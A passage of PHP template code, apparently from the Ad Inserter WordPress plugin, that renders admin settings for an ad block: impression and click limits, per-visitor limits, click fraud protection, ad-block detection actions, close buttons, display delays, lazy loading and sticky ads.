        $data_clicks = ai_get_impressions_and_clicks ($block, $obj->get_limit_clicks_time_period (), true);
        $impressions = $data_clicks [0];
        $clicks = $data_clicks [1];
        $time_period_clicks = $data_clicks [3];
      }
      if ($impressions == '' || $clicks == '') {
        $data_block = ai_get_impressions_and_clicks ($block, 1, true);
        $impressions = $data_block [0];
        $clicks = $data_block [1];
      }
    }

    $global_tracking = get_global_tracking ();
    $block_tracking = $obj->get_tracking (true);

    if (!$global_tracking) {
      $warning_style_tracking = '';
      $warning_title_tracking = __('Tracking is globally disabled', 'ad-inserter');
    }
    elseif (!$block_tracking) {
      $warning_style_tracking = '';
      $warning_title_tracking = __('Tracking for this block is disabled', 'ad-inserter');
    }
    else {
      $warning_style_tracking = 'display: none;';
      $warning_title_tracking = '';
    }

    $warning_style_cfp = 'display: none;';
    $warning_title_cfp = '';
    if ($obj->get_trigger_click_fraud_protection ()) {
      if (!$global_tracking) {
        $warning_style_cfp = '';
        $warning_title_cfp = __('Tracking is globally disabled', 'ad-inserter');
      }
      elseif (!$block_tracking) {
        $warning_style_cfp = '';
        $warning_title_cfp = __('Tracking for this block is disabled', 'ad-inserter');
      }
      elseif ($obj->get_trigger_click_fraud_protection () && !get_click_fraud_protection ()) {
        $warning_style_cfp = '';
        $warning_title_cfp = __('Click fraud protection is globally disabled', 'ad-inserter');
      }
    }

?>
      <div id="tab-limits-<?php echo $block; ?>" style="min-height: 24px; padding: 0;">

        <div class="ai-rounded">
          <table class="ai-responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td style="display: table-cell; padding-bottom: 8px;">
                  <strong>
                  <?php // Translators: Max n impressions ?>
                  <?php _e ('General limits', 'ad-inserter'); ?>
                  </strong>
                </td>
                <td style="display: table-cell; padding-bottom: 8px;  width: 35%; text-align: center;">
                  <strong>
                  <?php // Translators: Max n impressions per x days ?>
                  <?php _e ('Current value', 'ad-inserter'); ?>
                  </strong>
                  <span title='<?php echo $warning_title_tracking; ?>' style='font-size: 16px; vertical-align: middle; padding: 0; <?php echo $warning_style_tracking; ?>'>&#x26A0;</span>
                </td>
                <td style="display: table-cell;">
                  &nbsp;
                </td>
                <td style="display: table-cell;">
                  &nbsp;
                </td>
                <td style="display: table-cell; padding-bottom: 8px; text-align: right;">
                  <strong>
                  <?php _e ('Current value', 'ad-inserter'); ?>
                  </strong>
                </td>
              </tr>
              <tr>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_MAX_IMPRESSIONS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_max_impressions (); ?>" value="<?php echo $obj->get_max_impressions (); ?>" title="<?php _e ('Maximum number of impressions for this block. Empty means no general impression limit.', 'ad-inserter'); ?>" size="2" maxlength="6" style="<?php echo $obj->get_max_impressions () <= $impressions ? 'color: red;' : ''; ?>" />
                  <?php // Translators: Max n impressions ?>
                  <?php echo _n ('impression', 'impressions', (int) $obj->get_max_impressions (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px; text-align: center;">
                  <?php echo $impressions; ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions per x days ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_LIMIT_IMPRESSIONS_PER_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_limit_impressions_per_time_period (); ?>" value="<?php echo $obj->get_limit_impressions_per_time_period (); ?>" title= "<?php _e ('Maximum number of impressions per time period. Empty means no time limit.', 'ad-inserter'); ?>" size="2" maxlength="6" style="<?php echo $obj->get_limit_impressions_per_time_period () <= $time_period_impressions ? 'color: red;' : ''; ?>" />
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo _n ('impression', 'impressions', (int) $obj->get_limit_impressions_per_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo '&nbsp;'; _e('per', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_LIMIT_IMPRESSIONS_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_limit_impressions_time_period (); ?>" value="<?php echo $obj->get_limit_impressions_time_period (); ?>" title= "<?php _e ('Time period in days. Empty means no time limit.', 'ad-inserter'); ?>" size="4" maxlength="6" />
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo _n ('day', 'days', (int) $obj->get_limit_impressions_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px; text-align: right;">
                  <?php echo $time_period_impressions; ?>
                </td>
              </tr>
              <tr>
                <td style="display: table-cell;">
                  <?php // Translators: Max n clicks ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_MAX_CLICKS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_max_clicks (); ?>" value="<?php echo $obj->get_max_clicks (); ?>" title= "<?php _e ('Maximum number of clicks on this block. Empty means no general click limit.', 'ad-inserter'); ?>" size="2" maxlength="6" style="<?php echo $obj->get_max_clicks () <= $clicks ? 'color: red;' : ''; ?>"/>
                  <?php // Translators: Max n clicks ?>
                  <?php echo _n ('click', 'clicks', (int) $obj->get_max_clicks (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; text-align: center;">
                  <?php echo $clicks; ?>
                </td>
                <td style="display: table-cell;">
                  <?php // Translators: Max n clicks per x days ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_LIMIT_CLICKS_PER_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_limit_clicks_per_time_period (); ?>" value="<?php echo $obj->get_limit_clicks_per_time_period (); ?>" title= "<?php _e ('Maximum number of clicks per time period. Empty means no time limit.', 'ad-inserter'); ?>" size="2" maxlength="6" style="<?php echo $obj->get_limit_clicks_per_time_period () <= $time_period_clicks ? 'color: red;' : ''; ?>" />
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo _n ('click', 'clicks', (int) $obj->get_limit_clicks_per_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell;">
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo '&nbsp;'; _e('per', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_LIMIT_CLICKS_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_limit_clicks_time_period (); ?>" value="<?php echo $obj->get_limit_clicks_time_period (); ?>" title= "<?php _e ('Time period in days. Empty means no time limit.', 'ad-inserter'); ?>" size="4" maxlength="6" />
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo _n ('day', 'days', (int) $obj->get_limit_clicks_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell;padding-bottom: 4px; text-align: right;">
                  <?php echo $time_period_clicks; ?>
                </td>
              </tr>
            </tbody>
          </table>
        </div>

        <div class="ai-rounded">
          <table class="ai-responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td style="display: table-cell; padding-bottom: 8px; padding-right: 10px;">
                  <strong>
                  <?php _e ('Individual visitor limits', 'ad-inserter'); ?>
                  </strong>
                </td>
                <td style="display: table-cell; padding-bottom: 8px;  width: 35%; max-width: 150px; text-align: center;">
                  <input type="hidden" name="<?php echo AI_OPTION_TRIGGER_CLICK_FRAUD_PROTECTION, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" title= "<?php _e ('When specified number of clicks on this block for a visitor will be reached in the specified time period, all blocks that have click fraud protection enabled will be hidden for this visitor for the time period defined in general plugin settings.', 'ad-inserter'); ?>"  />
                  <input style="" id="trigger-cfp-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_TRIGGER_CLICK_FRAUD_PROTECTION, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_trigger_click_fraud_protection (); ?>" <?php if ($obj->get_trigger_click_fraud_protection () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="trigger-cfp-<?php echo $block; ?>" title= "<?php _e ('When specified number of clicks on this block for a visitor will be reached in the specified time period, all blocks that have click fraud protection enabled will be hidden for this visitor for the time period defined in general plugin settings.', 'ad-inserter'); ?>"><?php _e ('Trigger click fraud protection', 'ad-inserter'); ?></label>
                  <span title='<?php echo $warning_title_cfp; ?>' style='font-size: 16px; vertical-align: middle; padding: 0; <?php echo $warning_style_cfp; ?>'>&#x26A0;</span>
                </td>
                <td colspan="2" style="display: table-cell; padding-bottom: 8px;">
                </td>
                <td style="display: table-cell; visibility: hidden;">
                  <strong>
                  <?php _e ('Current value', 'ad-inserter'); ?>
                  </strong>
                </td>
              </tr>
              <tr style="padding-bottom: 2px;">
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_MAX_IMPRESSIONS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_max_impressions (); ?>" value="<?php echo $obj->get_visitor_max_impressions (); ?>" title= "<?php _e ('Maximum number of impressions of this block for each visitor. Empty means no impression limit.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n impressions ?>
                  <?php echo _n ('impression', 'impressions', (int) $obj->get_visitor_max_impressions (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions per x days ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_LIMIT_IMPRESSIONS_PER_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_limit_impressions_per_time_period (); ?>" value="<?php echo $obj->get_visitor_limit_impressions_per_time_period (); ?>" title= "<?php _e ('Maximum number of impressions per time period for each visitor. Empty means no impression limit per time period for visitors.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo _n ('impression', 'impressions', (int) $obj->get_visitor_limit_impressions_per_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo '&nbsp;'; _e('per', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_LIMIT_IMPRESSIONS_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_limit_impressions_time_period (); ?>" value="<?php echo $obj->get_visitor_limit_impressions_time_period (); ?>" title= "<?php _e ('Time period in days. Use decimal value (with decimal point) for shorter periods. Empty means no time limit.', 'ad-inserter'); ?>" size="4" maxlength="6" />
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo _n ('day', 'days', (int) $obj->get_visitor_limit_impressions_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell;">
                </td>
              </tr>
              <tr>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n clicks ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_MAX_CLICKS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_max_clicks (); ?>" value="<?php echo $obj->get_visitor_max_clicks (); ?>" title= "<?php _e ('Maximum number of clicks on this block for each visitor. Empty means no click limit.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n clicks ?>
                  <?php echo _n ('click', 'clicks', (int) $obj->get_visitor_max_clicks (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n clicks per x days ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_LIMIT_CLICKS_PER_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_limit_clicks_per_time_period (); ?>" value="<?php echo $obj->get_visitor_limit_clicks_per_time_period (); ?>" title= "<?php _e ('Maximum number of clicks per time period for each visitor. Empty means no click limit per time period for visitors.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo _n ('click', 'clicks', (int) $obj->get_visitor_limit_clicks_per_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo '&nbsp;'; _e('per', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_LIMIT_CLICKS_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_limit_clicks_time_period (); ?>" value="<?php echo $obj->get_visitor_limit_clicks_time_period (); ?>" title= "<?php _e ('Time period in days. Use decimal value (with decimal point) for shorter periods. Empty means no time limit.', 'ad-inserter'); ?>" size="4" maxlength="6" />
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo _n ('day', 'days', (int) $obj->get_visitor_limit_clicks_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  &nbsp;
                </td>
              </tr>
            </tbody>
          </table>
        </div>

        <div class="ai-rounded">
          <table class="ai-responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td style="display: table-cell; padding-right: 10px;">
                  <?php _e ('Fallback', 'ad-inserter'); ?>
                  <select id="limits-fallback-<?php echo $block; ?>" style="margin: 0 1px;" name="<?php echo AI_OPTION_LIMITS_FALLBACK, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_limits_fallback(); ?>" title="<?php _e ('Block to be used when a limit is reached', 'ad-inserter'); ?>">
                    <option value="" <?php echo ($obj->get_limits_fallback()=='') ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php _e ('Disabled', 'ad-inserter'); ?></option>
<?php

  for ($fallback_block = 1; $fallback_block <= 96; $fallback_block ++) {
?>
                      <option value="<?php echo $fallback_block; ?>" <?php echo ($obj->get_limits_fallback()==$fallback_block) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo $fallback_block, ' - ', $block_object [$fallback_block]->get_ad_name (); ?></option>
<?php
  }
?>
                    </select>
                </td>
              </tr>
            </tbody>
          </table>
        </div>

      </div>
<?php
  }

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {
?>
      <div id="tab-adb-<?php echo $block; ?>" class="ai-rounded" style="min-height: 24px;">
<?php  if (!$ai_wp_data [AI_ADB_DETECTION]) echo '<div title="', __ ('Ad blocking detection is disabled', 'ad-inserter'), '" style="float: left; font-size: 18px; color: red;">&#x26A0;</div>', "\n"; ?>
        <?php _e ('When ad blocking is detected', 'ad-inserter'); ?>
        <select style="margin: 0 1px;" id="adb-block-action-<?php echo $block; ?>" name="<?php echo AI_OPTION_ADB_BLOCK_ACTION, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_adb_block_action (); ?>">
          <option value="<?php echo AI_ADB_BLOCK_ACTION_DO_NOTHING; ?>" <?php echo ($obj->get_adb_block_action() == AI_ADB_BLOCK_ACTION_DO_NOTHING) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DO_NOTHING; ?></option>
          <option value="<?php echo AI_ADB_BLOCK_ACTION_REPLACE; ?>" <?php echo ($obj->get_adb_block_action() == AI_ADB_BLOCK_ACTION_REPLACE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_REPLACE; ?></option>
          <option value="<?php echo AI_ADB_BLOCK_ACTION_SHOW; ?>" <?php echo ($obj->get_adb_block_action() == AI_ADB_BLOCK_ACTION_SHOW) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_SHOW; ?></option>
          <option value="<?php echo AI_ADB_BLOCK_ACTION_HIDE; ?>" <?php echo ($obj->get_adb_block_action() == AI_ADB_BLOCK_ACTION_HIDE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_HIDE; ?></option>
        </select>

        <span id="adb-block-replacement-<?php echo $block; ?>" style="float: right; display: none;">
          <?php _e ('replacement', 'ad-inserter'); ?>
          <select style="max-width: 200px;" name="<?php echo AI_OPTION_ADB_BLOCK_REPLACEMENT, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_adb_block_replacement (); ?>" title="<?php _e ('Block to be shown when ad blocking is detected', 'ad-inserter'); ?>">
            <option value="" <?php echo ($obj->get_adb_block_replacement ()== '') ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php _ex ('None', 'replacement', 'ad-inserter'); ?></option>
<?php for ($alt_block = 1; $alt_block <= 96; $alt_block ++) { ?>
            <option value="<?php echo $alt_block; ?>" <?php echo ($obj->get_adb_block_replacement () == $alt_block) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo $alt_block, ' - ', $block_object [$alt_block]->get_ad_name (); ?></option>
<?php
  }
?>
          </select>
        </span>

        <div style="clear: both;"></div>
      </div>
<?php
  }
}

function ai_close_button_select ($block, $close_button, $default_close_button, $id = '', $name = '') {
?>
            <span style="vertical-align: middle;"><?php _e ('Close button', 'ad-inserter'); ?></span>
            &nbsp;&nbsp;
            <select id="<?php echo $id; ?>" name="<?php echo $name; ?>" style="margin: 0 1px;" default="<?php echo $default_close_button; ?>">
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-none"
                 data-title="<?php echo AI_TEXT_NONE; ?>"
                 value="<?php echo AI_CLOSE_NONE; ?>" <?php echo ($close_button == AI_CLOSE_NONE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BUTTON_NONE; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-top-left"
                 data-title="<?php echo AI_TEXT_TOP_LEFT; ?>"
                 value="<?php echo AI_CLOSE_TOP_LEFT; ?>" <?php echo ($close_button == AI_CLOSE_TOP_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TOP_LEFT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-top-right"
                 data-title="<?php echo AI_TEXT_TOP_RIGHT; ?>"
                 value="<?php echo AI_CLOSE_TOP_RIGHT; ?>" <?php echo ($close_button == AI_CLOSE_TOP_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TOP_RIGHT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-bottom-left"
                 data-title="<?php echo AI_TEXT_BOTTOM_LEFT; ?>"
                 value="<?php echo AI_CLOSE_BOTTOM_LEFT; ?>" <?php echo ($close_button == AI_CLOSE_BOTTOM_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BOTTOM_LEFT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-bottom-right"
                 data-title="<?php echo AI_TEXT_BOTTOM_RIGHT; ?>"
                 value="<?php echo AI_CLOSE_BOTTOM_RIGHT; ?>" <?php echo ($close_button == AI_CLOSE_BOTTOM_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BOTTOM_RIGHT; ?></option>
            </select>
<?php
}

function ai_display_close ($block, $obj, $default, $id, $name = '', $css = '') {
?>
          <span style="display: table-cell; white-space: nowrap;<?php echo $css; ?>">
<?php
  ai_close_button_select ($block, $obj->get_close_button (), $default->get_close_button (), $id, $name);
?>
          </span>
<?php
}

function ai_close_button ($block, $obj, $default) {
  if (!ai_remote_plugin_data ('pro', true)) return;

?>
        <div class="ai-rounded">
          <table class="ai-responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td>
  <?php ai_display_close ($block, $obj, $default, 'close-button-'.$block, AI_OPTION_CLOSE_BUTTON . WP_FORM_FIELD_POSTFIX . $block); ?>
                </td>
                <td style="display: table-cell; white-space: nowrap;">
                  <?php _e ('Auto close after', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_AUTO_CLOSE_TIME, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_auto_close_time (); ?>" value="<?php echo $obj->get_auto_close_time (); ?>" title= "<?php _e ('Time in seconds in which the ad will automatically close. Leave empty to disable auto closing.', 'ad-inserter'); ?>" size="1" maxlength="5" />
                  s
                </td>
                <td style="display: table-cell; white-space: nowrap; float: right;">
                  <?php // Translators: Don't show for x days ?>
                  <?php _e ('Don\'t show for', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_STAY_CLOSED_TIME, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_stay_closed_time (); ?>" value="<?php echo $obj->get_stay_closed_time (); ?>" title= "<?php _e ('Time in days in which closed ad will not be shown again. Use decimal value (with decimal point) for shorter time period or leave empty to show it again on page reload.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Don't show for x days ?>
                  <?php echo _n ('day', 'days', (int) $obj->get_stay_closed_time (), 'ad-inserter'); ?>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
<?php
}


function ai_delay_showing ($block, $obj, $default) {
  if (!ai_remote_plugin_data ('pro', true)) return;

?>
        <div class="ai-rounded">
          <table class="ai-responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td style="display: table-cell; white-space: nowrap; width: 35%;">
                  <?php // Translators: Delay showing for x pageviews ?>
                  <?php _e ('Delay showing for', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_DELAY_TIME, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_delay_time (); ?>" value="<?php echo $obj->get_delay_time (); ?>" title= "<?php _e ('Time in ms before the code is inserted (and ad displayed). Leave empty to insert the code without any additional delay.', 'ad-inserter'); ?>" size="1" maxlength="5" />
                  ms
                </td>
                <td style="display: table-cell; white-space: nowrap; width: 35%;">
                  <?php // Translators: Delay showing for x pageviews ?>
                  <?php _e ('Delay showing for', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_DELAY_SHOWING, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_delay_showing (); ?>" value="<?php echo $obj->get_delay_showing (); ?>" title= "<?php _e ('Number of pageviews before the code is inserted (and ad displayed). Leave empty to insert the code for the first pageview.', 'ad-inserter'); ?>" size="1" maxlength="3" />
                  <?php // Translators: Delay showing for x pageviews ?>
                  <?php echo _n ('pageview', 'pageviews', (int) $obj->get_delay_showing (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; white-space: nowrap; text-align: right;">
                  <?php // Translators: Show every x pageviews ?>
                  <?php echo _n ('Show every', 'Show every', (int) $obj->get_show_every (), 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_SHOW_EVERY, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_show_every (); ?>" value="<?php echo $obj->get_show_every (); ?>" title= "<?php _e ('Number of pageviews to insert the code again. Leave empty to insert the code for every pageview.', 'ad-inserter'); ?>" size="1" maxlength="3" />
                  <?php // Translators: Show every x pageviews ?>
                  <?php echo _n ('pageview', 'pageviews', (int) $obj->get_show_every (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; white-space: nowrap;">
                </td>
              </tr>
            </tbody>
          </table>
        </div>
<?php
}


function ai_display_loading ($block, $obj, $default) {
  if (!ai_remote_plugin_data ('pro', true)) return;

?>
        <div class="ai-rounded">
          <table class="ai-responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <?php if (ai_settings_check ('AD_INSERTER_RECAPTCHA')) { ?>
                <td style="width: 10%; padding-right: 10px; ">
                  <input type="hidden" name="<?php echo AI_OPTION_CHECK_RECAPTCHA_SCORE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input style="" id="check-recaptcha-score-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_CHECK_RECAPTCHA_SCORE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_check_recaptcha_score (); ?>" <?php if ($obj->get_check_recaptcha_score () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="check-recaptcha-score-<?php echo $block; ?>"><?php _e ('Check reCAPTCHA score', 'ad-inserter'); ?></label>
                </td>
                <?php } ?>
                <td style="width: 10%;">
                  <input type="hidden" name="<?php echo AI_OPTION_WAIT_FOR_INTERACTION, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input style="" id="wait-for-interaction-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_WAIT_FOR_INTERACTION, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_wait_for_interaction (); ?>" <?php if ($obj->get_wait_for_interaction () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="wait-for-interaction-<?php echo $block; ?>"><?php _e ('Wait for user interaction', 'ad-inserter'); ?></label>
                </td>
                <td style="padding-left: 10px; width: 10%;">
                  <input type="hidden" name="<?php echo AI_OPTION_LAZY_LOADING, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input style="" id="lazy-loading-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_LAZY_LOADING, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_lazy_loading (); ?>" <?php if ($obj->get_lazy_loading () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="lazy-loading-<?php echo $block; ?>"><?php _e ('Lazy loading', 'ad-inserter'); ?></label>
                </td>
                <td style="padding-left: 10px; float: right;">
                  <?php _e ('Manual loading', 'ad-inserter'); ?>
                  <select id="manual-loading-<?php echo $block; ?>" name="<?php echo AI_OPTION_MANUAL_LOADING, WP_FORM_FIELD_POSTFIX, $block; ?>" style="margin: 0 1px;" default="<?php echo $default->get_manual_loading (); ?>">
                     <option value="<?php echo AI_MANUAL_LOADING_DISABLED; ?>" <?php echo ($obj->get_manual_loading () == AI_MANUAL_LOADING_DISABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DISABLED; ?></option>
                     <option value="<?php echo AI_MANUAL_LOADING_AUTO; ?>" <?php echo ($obj->get_manual_loading () == AI_MANUAL_LOADING_AUTO) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_AUTO; ?></option>
                     <option value="<?php echo AI_MANUAL_LOADING_ENABLED; ?>" <?php echo ($obj->get_manual_loading () == AI_MANUAL_LOADING_ENABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENABLED; ?></option>
                  </select>
                </td>
              </tr>
            </tbody>
          </table>
        </div>

        <div class="ai-rounded">
          <table class="ai-responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td style="width: 30%;">
                  <input type="hidden" name="<?php echo AI_OPTION_PROTECTED, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input id="protected-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_PROTECTED, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_protected (); ?>" <?php if ($obj->get_protected () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="protected-<?php echo $block; ?>"><?php _e ('Protected', 'ad-inserter'); ?></label>
                </td>
                <td style="width: 50%; text-align: right;">
                  <input type="hidden" name="<?php echo AI_OPTION_STICKY, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input id="sticky-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_STICKY, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" title= "<?php _e ('Sticky ad with scrolling space below', 'ad-inserter'); ?>" default="<?php echo $default->get_sticky (); ?>" <?php if ($obj->get_sticky () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="sticky-<?php echo $block; ?>"><?php /* Translators: Sticky ad */ _e ('Sticky', 'ad-inserter'); ?></label>

                  <input type="text" id="sticky-height-<?php echo $block; ?>" name="<?php echo AI_OPTION_STICKY_HEIGHT, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_sticky_height (); ?>" value="<?php echo $obj->get_sticky_height (); ?>" title= "<?php _e ('Height of the scrolling space below the ad', 'ad-inserter'); ?>" size="3" maxlength="8" />
                  px
                </td>
              </tr>
            </tbody>
          </table>
        </div>

<?php
}

